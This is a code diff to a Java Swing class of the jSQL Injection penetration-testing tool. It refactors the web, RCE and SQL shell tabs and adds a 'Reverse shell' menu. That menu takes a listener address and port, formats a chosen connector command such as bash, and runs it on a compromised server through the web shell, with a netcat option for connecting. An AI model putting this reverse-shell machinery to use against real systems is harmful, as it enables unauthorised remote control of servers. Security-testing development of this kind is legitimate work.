@@ -15,15 +15,19 @@ import com.jsql.model.bean.database.AbstractElementDatabase;
 import com.jsql.util.I18nUtil;
 import com.jsql.util.LogLevelUtil;
 import com.jsql.util.StringUtil;
+import com.jsql.util.reverse.ModelReverse;
 import com.jsql.view.swing.action.ActionCloseTabResult;
 import com.jsql.view.swing.action.HotkeyUtil;
 import com.jsql.view.swing.popupmenu.JPopupMenuText;
-import com.jsql.view.swing.terminal.*;
 import com.jsql.view.swing.tab.dnd.DnDTabbedPane;
 import com.jsql.view.swing.tab.dnd.TabTransferHandler;
 import com.jsql.view.swing.table.PanelTable;
+import com.jsql.view.swing.terminal.AbstractExploit;
+import com.jsql.view.swing.terminal.ExploitReverseShell;
 import com.jsql.view.swing.text.JPopupTextArea;
+import com.jsql.view.swing.text.JTextFieldPlaceholder;
 import com.jsql.view.swing.util.MediatorHelper;
+import com.jsql.view.swing.util.RadioItemPreventClose;
 import com.jsql.view.swing.util.UiStringUtil;
 import com.jsql.view.swing.util.UiUtil;
 import org.apache.commons.lang3.StringUtils;
@@ -33,12 +37,14 @@ import org.apache.logging.log4j.Logger;
 import javax.swing.*;
 import javax.swing.event.HyperlinkEvent;
 import java.awt.*;
-import java.awt.event.FocusAdapter;
-import java.awt.event.FocusEvent;
+import java.awt.event.*;
 import java.io.IOException;
 import java.net.MalformedURLException;
 import java.net.URISyntaxException;
+import java.util.Arrays;
+import java.util.List;
 import java.util.UUID;
+import java.util.function.BiConsumer;
 import java.util.function.IntConsumer;
 
 /**
@@ -53,6 +59,9 @@ public class TabResults extends DnDTabbedPane {
 
     public static final String TAB_EXPLOIT_FAILURE_INCORRECT_URL = "Tab exploit failure: incorrect URL";
     public static final String RCE_SHELL = "RCE shell";
+    public static final String SQL_SHELL = "sqlShell";
+    public static final String WEB_SHELL = "webShell";
+    public static final String REV_SHELL = "revShell";
 
     /**
      * Create the panel containing injection results.
@@ -125,15 +134,21 @@ public class TabResults extends DnDTabbedPane {
     public void addTabExploitWeb(String url) {
         try {
             var terminalID = UUID.randomUUID();
-            var terminal = new ExploitWeb(terminalID, url);
+            var terminal = new AbstractExploit(terminalID, url, "web") {
+                @Override
+                public void action(String command, UUID terminalID, String urlShell, String... arg) {
+                    MediatorHelper.model().getResourceAccess().runWebShell(command, terminalID, urlShell);
+                }
+            };
+            terminal.setName(TabResults.WEB_SHELL);
             MediatorHelper.frame().getMapUuidShell().put(terminalID, terminal);
 
-            JScrollPane scroller = new JScrollPane(terminal);
-            this.addTab("Web shell", scroller);
-            this.setSelectedComponent(scroller);  // Focus on the new tab
+            JPanel panelTerminalWithReverse = this.getTerminalWithMenu(terminal);
+            this.addTab("Web shell", panelTerminalWithReverse);
+            this.setSelectedComponent(panelTerminalWithReverse);  // Focus on the new tab
 
             var header = new TabHeader("Web shell", UiUtil.TERMINAL.getIcon());
-            this.setTabComponentAt(this.indexOfComponent(scroller), header);
+            this.setTabComponentAt(this.indexOfComponent(panelTerminalWithReverse), header);
             terminal.requestFocusInWindow();
 
             this.updateUI();  // required: light, open/close prefs, dark => light artifacts
@@ -146,6 +161,7 @@ public class TabResults extends DnDTabbedPane {
         try {
             var terminalID = UUID.randomUUID();
             var terminal = new ExploitReverseShell(terminalID, port);
+            terminal.setName(TabResults.REV_SHELL);
             MediatorHelper.frame().getMapUuidShell().put(terminalID, terminal);
 
             JScrollPane scroller = new JScrollPane(terminal);
@@ -162,118 +178,23 @@ public class TabResults extends DnDTabbedPane {
         }
     }
 
-    public void addTabExploitRceMysql() {
+    public void addTabExploitRce(BiConsumer<String, UUID> biConsumerRunCmd) {
         try {
             var terminalID = UUID.randomUUID();
-            var terminal = new ExploitRceMysql(terminalID);
+            var terminal = new AbstractExploit(terminalID, null, "rce") {
+                @Override
+                public void action(String command, UUID terminalID, String urlShell, String... arg) {
+                    biConsumerRunCmd.accept(command, terminalID);
+                }
+            };
             MediatorHelper.frame().getMapUuidShell().put(terminalID, terminal);
 
-            JScrollPane scroller = new JScrollPane(terminal);
-            this.addTab(TabResults.RCE_SHELL, scroller);
-            this.setSelectedComponent(scroller);  // Focus on the new tab
+            JPanel panelTerminalWithReverse = this.getTerminalWithMenu(terminal);
+            this.addTab(TabResults.RCE_SHELL, panelTerminalWithReverse);
+            this.setSelectedComponent(panelTerminalWithReverse);  // Focus on the new tab
 
             var header = new TabHeader(TabResults.RCE_SHELL, UiUtil.TERMINAL.getIcon());
-            this.setTabComponentAt(this.indexOfComponent(scroller), header);
-            terminal.requestFocusInWindow();
-
-            this.updateUI();  // required: light, open/close prefs, dark => light artifacts
-        } catch (MalformedURLException | URISyntaxException e) {
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, TabResults.TAB_EXPLOIT_FAILURE_INCORRECT_URL, e);
-        }
-    }
-
-    public void addTabExploitRceOracle() {
-        try {
-            var terminalID = UUID.randomUUID();
-            var terminal = new ExploitRceOracle(terminalID);
-            MediatorHelper.frame().getMapUuidShell().put(terminalID, terminal);
-
-            JScrollPane scroller = new JScrollPane(terminal);
-            this.addTab(TabResults.RCE_SHELL, scroller);
-            this.setSelectedComponent(scroller);  // Focus on the new tab
-
-            var header = new TabHeader(TabResults.RCE_SHELL, UiUtil.TERMINAL.getIcon());
-            this.setTabComponentAt(this.indexOfComponent(scroller), header);
-            terminal.requestFocusInWindow();
-
-            this.updateUI();  // required: light, open/close prefs, dark => light artifacts
-        } catch (MalformedURLException | URISyntaxException e) {
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, TabResults.TAB_EXPLOIT_FAILURE_INCORRECT_URL, e);
-        }
-    }
-
-    public void addTabExploitRceExtensionPostgres() {
-        try {
-            var terminalID = UUID.randomUUID();
-            var terminal = new ExploitRceExtensionPostgres(terminalID);
-            MediatorHelper.frame().getMapUuidShell().put(terminalID, terminal);
-
-            JScrollPane scroller = new JScrollPane(terminal);
-            this.addTab(TabResults.RCE_SHELL, scroller);
-            this.setSelectedComponent(scroller);  // Focus on the new tab
-
-            var header = new TabHeader(TabResults.RCE_SHELL, UiUtil.TERMINAL.getIcon());
-            this.setTabComponentAt(this.indexOfComponent(scroller), header);
-            terminal.requestFocusInWindow();
-
-            this.updateUI();  // required: light, open/close prefs, dark => light artifacts
-        } catch (MalformedURLException | URISyntaxException e) {
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, TabResults.TAB_EXPLOIT_FAILURE_INCORRECT_URL, e);
-        }
-    }
-
-    public void addTabExploitRceWalPostgres() {
-        try {
-            var terminalID = UUID.randomUUID();
-            var terminal = new ExploitRceWalPostgres(terminalID);
-            MediatorHelper.frame().getMapUuidShell().put(terminalID, terminal);
-
-            JScrollPane scroller = new JScrollPane(terminal);
-            this.addTab(TabResults.RCE_SHELL, scroller);
-            this.setSelectedComponent(scroller);  // Focus on the new tab
-
-            var header = new TabHeader(TabResults.RCE_SHELL, UiUtil.TERMINAL.getIcon());
-            this.setTabComponentAt(this.indexOfComponent(scroller), header);
-            terminal.requestFocusInWindow();
-
-            this.updateUI();  // required: light, open/close prefs, dark => light artifacts
-        } catch (MalformedURLException | URISyntaxException e) {
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, TabResults.TAB_EXPLOIT_FAILURE_INCORRECT_URL, e);
-        }
-    }
-
-    public void addTabExploitRceProgramPostgres() {
-        try {
-            var terminalID = UUID.randomUUID();
-            var terminal = new ExploitRceProgramPostgres(terminalID);
-            MediatorHelper.frame().getMapUuidShell().put(terminalID, terminal);
-
-            JScrollPane scroller = new JScrollPane(terminal);
-            this.addTab(TabResults.RCE_SHELL, scroller);
-            this.setSelectedComponent(scroller);  // Focus on the new tab
-
-            var header = new TabHeader(TabResults.RCE_SHELL, UiUtil.TERMINAL.getIcon());
-            this.setTabComponentAt(this.indexOfComponent(scroller), header);
-            terminal.requestFocusInWindow();
-
-            this.updateUI();  // required: light, open/close prefs, dark => light artifacts
-        } catch (MalformedURLException | URISyntaxException e) {
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, TabResults.TAB_EXPLOIT_FAILURE_INCORRECT_URL, e);
-        }
-    }
-
-    public void addTabExploitRceSqlite() {
-        try {
-            var terminalID = UUID.randomUUID();
-            var terminal = new ExploitRceSqlite(terminalID);
-            MediatorHelper.frame().getMapUuidShell().put(terminalID, terminal);
-
-            JScrollPane scroller = new JScrollPane(terminal);
-            this.addTab(TabResults.RCE_SHELL, scroller);
-            this.setSelectedComponent(scroller);  // Focus on the new tab
-
-            var header = new TabHeader(TabResults.RCE_SHELL, UiUtil.TERMINAL.getIcon());
-            this.setTabComponentAt(this.indexOfComponent(scroller), header);
+            this.setTabComponentAt(this.indexOfComponent(panelTerminalWithReverse), header);
             terminal.requestFocusInWindow();
 
             this.updateUI();  // required: light, open/close prefs, dark => light artifacts
@@ -285,7 +206,14 @@ public class TabResults extends DnDTabbedPane {
     public void addTabExploitSql(String url, String user, String pass) {
         try {
             var terminalID = UUID.randomUUID();
-            var terminal = new ExploitSql(terminalID, url, user, pass);
+            var terminal = new AbstractExploit(terminalID, url, "sql") {
+                @Override
+                public void action(String cmd, UUID terminalID, String wbhPath, String... arg) {
+                    MediatorHelper.model().getResourceAccess().runSqlShell(cmd, terminalID, wbhPath, arg[0], arg[1]);
+                }
+            };
+            terminal.setName(TabResults.SQL_SHELL);
+            terminal.setLoginPassword(new String[]{ user, pass });
             MediatorHelper.frame().getMapUuidShell().put(terminalID, terminal);
 
             JScrollPane scroller = new JScrollPane(terminal);
@@ -314,5 +242,164 @@ public class TabResults extends DnDTabbedPane {
         this.setTabComponentAt(this.indexOfComponent(panelTable), header);
 
         this.updateUI();  // required: light, open/close prefs, dark => light artifacts
+    }
+
+    private JPanel getTerminalWithMenu(AbstractExploit terminal) {
+        JPanel panelTerminalWithReverse = new JPanel() {
+            @Override
+            public boolean isOptimizedDrawingEnabled() {
+                return false;  // both components always visible
+            }
+        };
+        OverlayLayout overlay = new OverlayLayout(panelTerminalWithReverse);
+        panelTerminalWithReverse.setLayout(overlay);
+
+        var panelReverseMargin = new JPanel();
+        panelReverseMargin.setLayout(new BoxLayout(panelReverseMargin, BoxLayout.LINE_AXIS));
+        panelReverseMargin.setOpaque(false);
+        panelReverseMargin.setBorder(BorderFactory.createEmptyBorder(10, 0, 0, 10));
+
+        var menuReverse = new JLabel("Reverse shell", UiUtil.ARROW_DOWN.getIcon(), SwingConstants.LEFT);
+        menuReverse.addMouseListener(new MouseAdapter() {
+            @Override
+            public void mousePressed(MouseEvent e) {
+                var popupMenu = TabResults.this.showMenu(terminal);
+                popupMenu.updateUI();  // required: incorrect when dark/light mode switch
+                popupMenu.show(e.getComponent(), e.getComponent().getX(),5 + e.getComponent().getY() + e.getComponent().getHeight());
+                popupMenu.setLocation(e.getComponent().getLocationOnScreen().x,5 + e.getComponent().getLocationOnScreen().y + e.getComponent().getHeight());
+            }
+        });
+        menuReverse.setMaximumSize(menuReverse.getPreferredSize());
+        JScrollPane scrollerTerminal = new JScrollPane(terminal);
+        scrollerTerminal.setAlignmentX(1f);
+        scrollerTerminal.setAlignmentY(0f);
+        panelReverseMargin.setAlignmentX(1f);
+        panelReverseMargin.setAlignmentY(0f);
+        panelReverseMargin.add(menuReverse);
+        panelTerminalWithReverse.add(panelReverseMargin);
+        panelTerminalWithReverse.add(scrollerTerminal);
+
+        return panelTerminalWithReverse;
+    }
+
+    private JPopupMenu showMenu(AbstractExploit terminal) {
+        JPopupMenu menuReverse = new JPopupMenu();
+
+        var menuListen = new JMenu("Listen");
+        menuListen.setComponentOrientation(
+            ComponentOrientation.RIGHT_TO_LEFT.equals(ComponentOrientation.getOrientation(I18nUtil.getCurrentLocale()))
+            ? ComponentOrientation.LEFT_TO_RIGHT
+            : ComponentOrientation.RIGHT_TO_LEFT
+        );
+        var panelPublicAddress = new JPanel(new BorderLayout());
+        panelPublicAddress.add(new JLabel("<html><b>Your public address (listener) :</b></html>"));
+        menuListen.add(panelPublicAddress);
+        menuListen.add(new JSeparator());
+        var address = new JTextFieldPlaceholder("Local IP/domain", "10.0.2.2");
+        menuListen.add(address);
+        var port = new JTextFieldPlaceholder("Local port", "4444");
+        menuListen.add(port);
+
+        var panelServerConnection = new JPanel(new BorderLayout());
+        panelServerConnection.add(new JLabel("<html><b>Server method (connector) :</b></html>"));
+        menuListen.add(panelServerConnection);
+        menuListen.add(new JSeparator());
+        var buttonGroup = new ButtonGroup();
+        List<ModelReverse> commandsReverse = MediatorHelper.model().getMediatorUtils().getPreferencesUtil().getCommandsReverse();
+        commandsReverse.forEach(modelReverse -> {
+            var radio = new RadioItemPreventClose(modelReverse.getName());
+            radio.setActionCommand(modelReverse.getName());
+            radio.setSelected("bash".equals(modelReverse.getName()));
+            buttonGroup.add(radio);
+            menuListen.add(radio);
+        });
+
+        Runnable runnableReverse = () -> {
+            try {
+                Thread.sleep(2500);
+                MediatorHelper.model().getMediatorUtils().getPreferencesUtil().getCommandsReverse().stream()
+                .filter(modelReverse -> modelReverse.getName().equals(buttonGroup.getSelection().getActionCommand()))
+                .findFirst()
+                .ifPresent(modelReverse -> {
+                    // TODO mysql UDF, pg Program/Extension/Archive, sqlite
+                    MediatorHelper.model().getResourceAccess().runWebShell(
+                        String.format(modelReverse.getCommand(), address.getText(), port.getText()),
+                        null,  // ignore connection response
+                        terminal.getUrlShell(),
+                        true
+                    );
+                });
+            } catch (InterruptedException ex) {
+                LOGGER.log(LogLevelUtil.CONSOLE_JAVA, ex);
+            }
+        };
+
+        var panelOpenIn = new JPanel(new BorderLayout());
+        panelOpenIn.add(new JLabel("<html><b>Open In :</b></html>"));
+        menuListen.add(panelOpenIn);
+        menuListen.add(new JSeparator());
+
+        var menuBuiltInShell = new RadioItemPreventClose("Built-in shell", true);
+        var menuExternalShell = new RadioItemPreventClose("External listening shell");
+        var buttonTypeShell = new ButtonGroup();
+        buttonTypeShell.add(menuBuiltInShell);
+        buttonTypeShell.add(menuExternalShell);
+        menuListen.add(menuBuiltInShell);
+        menuListen.add(menuExternalShell);
+        menuListen.add(new JSeparator());
+        var panelCreate = new JPanel(new BorderLayout());
+        panelCreate.add(new JButton(new AbstractAction("Create reverse shell") {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                if (menuBuiltInShell.isSelected()) {
+                    SwingUtilities.invokeLater(() -> MediatorHelper.tabResults().addTabExploitReverseShell(port.getText()));
+                }
+                new Thread(runnableReverse).start();
+                menuReverse.setVisible(false);
+            }
+        }));
+        menuListen.add(panelCreate);
+
+        var menuConnect = new JMenu("Connect");
+        menuConnect.setComponentOrientation(
+            ComponentOrientation.RIGHT_TO_LEFT.equals(ComponentOrientation.getOrientation(I18nUtil.getCurrentLocale()))
+            ? ComponentOrientation.LEFT_TO_RIGHT
+            : ComponentOrientation.RIGHT_TO_LEFT
+        );
+        var panelServerPublicAddress = new JPanel(new BorderLayout());
+        panelServerPublicAddress.add(new JLabel("<html><b>Server public address (listener) :</b></html>"));
+        menuConnect.add(panelServerPublicAddress);
+        menuConnect.add(new JSeparator());
+        menuConnect.add(new JTextFieldPlaceholder("Target IP/domain"));
+        menuConnect.add(new JTextFieldPlaceholder("Target port"));
+        menuConnect.add(new JSeparator());
+
+        var panelServerListeningConnection = new JPanel(new BorderLayout());
+        panelServerListeningConnection.add(new JLabel("<html><b>Server listening method :</b></html>"));
+        menuConnect.add(panelServerListeningConnection);
+        var buttonGroupListening = new ButtonGroup();
+        Arrays.asList("netcat").forEach(method -> {
+            var radio = new JRadioButtonMenuItem(method) {
+                @Override
+                protected void processMouseEvent(MouseEvent evt) {
+                    if (evt.getID() == MouseEvent.MOUSE_RELEASED && this.contains(evt.getPoint())) {
+                        this.doClick();
+                        this.setArmed(true);
+                    } else {
+                        super.processMouseEvent(evt);
+                    }
+                }
+            };
+            radio.setSelected("netcat".equals(method));
+            buttonGroupListening.add(radio);
+            menuConnect.add(radio);
+        });
+        menuConnect.add(new JSeparator());
+        menuConnect.add(new JMenuItem("Create"));
+
+        menuReverse.add(menuListen);
+        menuReverse.add(menuConnect);
+
+        return menuReverse;
     }
 }
